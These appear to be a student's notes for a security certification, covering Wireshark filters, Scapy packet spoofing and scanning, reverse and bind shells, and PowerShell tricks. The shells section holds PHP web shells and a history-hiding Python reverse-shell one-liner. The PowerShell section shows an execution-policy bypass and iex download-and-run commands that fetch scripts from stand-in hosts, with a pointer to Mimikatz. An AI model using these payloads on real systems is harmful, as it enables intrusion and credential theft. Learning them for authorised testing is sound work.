# Notes for the C3SA certification.

*I will skip over the Web Application Basics and Exploitation, since it's a very short module and
just talks about packet sniffing and IDN homograph attacks through Punycode.*

## Network basics and exploitation.

In this module, we will touch three topics: Wireshark, Scapy and remote shells.

### Basic Wireshark usage.

First off we'll need to install Wireshark. Depending on the distro at hand, this might be done in a
couple of different ways. In my case, as I use Arch, I can install it using Pacman.

```bash
sudo pacman -S wireshark-qt
```

The package to download is the GUI version of Wireshark. Of course, in a TUI environment we could use
wireshark-cli or termshark, but since it's easier to use the QT version, I'll go for that one... *for now.*

Now, let's add our own user to the Wireshark group. This will let us use the application without having to
use sudo. This can be done with the following command:

```bash
sudo usermod -aG wireshark {user}
```

Now we logout of our session and login back again. Now we can run it without root perms.

We'll open the app and then select the interface to listen on. It's usually eth0 or enp2s0. After we do that,
we'll see the gigantic network traffic that goes and comes in our network. 

We can filter in two ways: via display filter or capture filter. The display filter is more limited than the
capture filters.

Some display filters are:

|       Option          |   Function              |
| --------------------- | ----------------------- |
|     tcp               | Only show TCP packets.  |
|     udp               | Only show UDP packets.  |
|ip.addr == {ip}        | Filter by IP address.   |
|tcp.port (eq|=) {port} | Filter by TCP port.     |
|udp.port (eq|=) {port} | Filter by UDP port.     |

[DisplayFilters](https://wiki.wireshark.org/DisplayFilters)


Some capture filters are:

| Option                            |                  Function                                      |
| --------------------------------- | -------------------------------------------------------------- |
| host {ip}                         | Only capture the traffic from the given IP.                    |
| net {net}                         | Only capture the traffic from the given network.               |
| mask {mask}                       | Specify a network mask. Can be omitted by using /24 or others. |
| src {ip/net}                      | filter by source ip or network.                                |
| dst {ip/net}                      | filter by destination ip or network.                           |
| port {port}                       | filter by port number                                          |
| {tcp/udp} portrange {portrange}   | filter by tcp/udp port-range                                   |
| ip                                | filter only ipv4 packets                                       |

[CaptureFilters](https://wiki.wireshark.org/CaptureFilters)



Some filtering options work with logic, similar to programming logic (and, or, less or equal, etc).
This means that we can apply some operands to further filter the output. Some of the operands are:

| Operand |       Meaning      |
| ------- | ------------------ |
|   >=    | More than or equal |
|   <=    | Less than or equal |
|    <    | Less               |
|    >    | More               |
|   ==    | Equals             |
|   !=    | Not equal to       |
|    !    | Not/negation       |
|   mt    | More than or equal |
|   lt    | Less than or equal |
|   eq    | Equals             |
|   ne    | Not equal to       |
|   or    | or                 |
|   not   | not                |


## Scapy

Install Scrapy with `pacman -S scrapy`. We'll need to open the application with root privileges.

To list all the protocols available to use we can run the command `ls()`. Given the fact that Scapy
uses prompt-toolkit (or a very similar prompt) we can press tab inside the parenthesis to see what
values we can input and their respective datatype. It's useful to check a protocol's complete body,
and also to later on craft custom packets.

In the case we wanted to create a completely custom packet, we'd need to run `b.hide_defaults( )`
so Scapy only uses user supplied values.

[ICMP protocol body](scapy_ls.png)

With `lsc()` we can check all the available commands.

[Available commands.](scapy_lsc.png)

### Packet creation with Scapy

```python
packet_3 = IP(dst="127.0.0.1")/ICMP() # Layer 3 packet. Scapy will create the layer 2.
packet_2 = Ether()/IP(dst="127.0.0.1")/ICMP() # Layer 2 packet.
```

As seen, we can join or "stack" packets together using the '/' character. 

We can spoof addresses by changing the src IP header.

```python
packet_spoof = IP(dst="google.com", src="192.168.1.253")/ICMP()
```

Using Wireshark, we can set the filter "ip.addr == 192.168.1.253" and check the packet.

[](scapy_spoof.png)

We can also add custom raw payloads.

```python
raw_payload = Ether()/IP(dst="nmap.scanme.org")/ICMP()/"CUSTOM_PAYLOAD"
```

This can have different effects depending on the receiving side.

We can also target specific ports on the receiving end.

```python
port_packet = Ether()/IP(dst="nmap.scanme.org")/TCP(dport=443, flags="S")
```

As seen, we can also set TCP flags. Useful to check how a system would act in front of, for example,
a packet with both SYN and URG bits set. [Read the RFC-9293 for more info.](https://datatracker.ietf.org/doc/html/rfc9293)

### Sending packets and reading responses.

Depending on the layer packet we created, we can send the packet in a couple different ways.

```python
send(packet)  # For layer 3 packets.
sendp(packet) # For layer 2 packets.
sr(packet)    # Sends a packet and waits for a response.
ans,unans =_  # Stores the responses from sr()
ans.show()    # Shows the answers.
```

[Read the docs for more info.](https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html)

### Probing hosts with ICMP and TCP SYN packets.

We can combine some of what we've learned to make a "scanner" from scrap.

```python
probe = IP(dst="192.168.1.0/24")/ICMP() 
ans, unans = sr(probe)
ans.summary(lambda s,r: r.sprintf('IP: %IP.src% is up.'))
```

```python
tcp_probe = IP(dst="google.com")/TCP(dport=443, flags=S)
ans, unans = sr(tcp_probe)
ans.summary(lambda s,r: r.sprintf('IP: %IP.src% is up'))
# s is for the packets we've sent, and r is for the responses we got. that's why we use %IP.src% instead of %IP.dst%.
# if we were to use %IP.dst%, we'd get our own IP. this applies to almost all packets AFAIK
```

[More on packet inspection](https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/inspecting_packets/index.html)

## Shells

### Reverse shells

C3SA teaches how to establish a reverse shell using Netcat. On the attacker machine we can run `nc -nlvp {port}` and on the
Metasploitable machine we can run `nc {ip} {port} -e {exec}` to establish a reverse session. 

There are many other ways to create reverse shells. We could use Metasploit, Hoaxshell, pure TCP socket shell, Python, and
many other ways. But I'd like to share how I often create and use reverse shells.

I enjoy creating PHP shells. They're extremely versatile and very powerful, even the most basic implementations of it, at
least in my opinion. The one I go for more often is the following:

```php
<?php 
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
}
?>
```

Stealthier ones can be created, like the following:

```php
<?php
$_=$_POST['1'];
$__=$_POST['2'];
$_($__);
?>
```

Of course, these are pretty basic shells. If we had remote code execution over a web app for example, we could run a Python
script (if the server has a Python binary of course). A one liner can be used in this case:

```bash
export rhost="127.0.0.1";export rport=443 && python -c 'import os,pty,socket;s=socket.socket();s.connect((os.getenv("rhost"),int(os.getenv("rport"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];os.environ["HISTFILE"]="/dev/null";pty.spawn(["/bin/bash", "-i"])'
```

I was inspired by some of the Python shells in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to write that. The main change I did was to set the HISTFILE environment variable to /dev/null, so bash_history wasn't
filled with the commands we input, not to avoid detection, but to hide our techniques.

### Bind shells

Just use netcat. If you can't use Netcat (maybe the machine doesn't have it), you can use LOTL techniques to
get it. `Invoke-WebRequest`, `wget` and more can be used to get scripts to the local machine. 

## Powershell

### Execution Policies

["PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts."](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3)

Given that, sometimes we'll try to run malicious scripts, but we won't be able to thanks to this policy.
Nevertheless, we can change it.

```powershell
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope Process
```

We don't need to modify registry keys. [Docs](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3)

### Dotsourcing

[What is it?](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-7.3#script-scope-and-dot-sourcing)

In more Linux-friendly terms: call a script from another script and allow it access to the caller script 
environment variables, aliases and functions. It's like importing a library in Python and passing a
variable to a method.

Why is this useful? Some security policies might deny you the ability to run scripts, period. Thanks
to dotsourcing, we can bypass this restrictions. 

To do it, let's first change the execution policy like we learned to do above. Then, we have to do the
following:

```powershell
. .\Invoke-OurScript.ps1
Import-Module Invoke-OurScript.ps1
```

The script is loaded and ready to be executed. 

### File downloads

Downloading files in Powershell is as easy to do as in Linux. There are various methods to do so.

```powershell
iex (New-Object Net.WebClient).DownloadString('http://linktothescript.com/BaddieStuff.ps1')
BaddieStuff -Command '"hacktheworld"'

Invoke-WebRequest -URI http://linktoscript.haxxor/CorpoHack.ps1 -OutFile C:\Path\To\Save\File

(New-Object System.Net.WebClient).DownloadFile("http://hacktheworld.com/file", "C:\Path\To\File")

Start-BitsTransfer -Source "http://hackthland.com/scriptor.ps1" -Destination "C:\Where\To\Save"
```

I'm sure there are other ways to download files, but this are the ones I found.

Combine this with Mimikatz or other tools to get credentials or something else. 
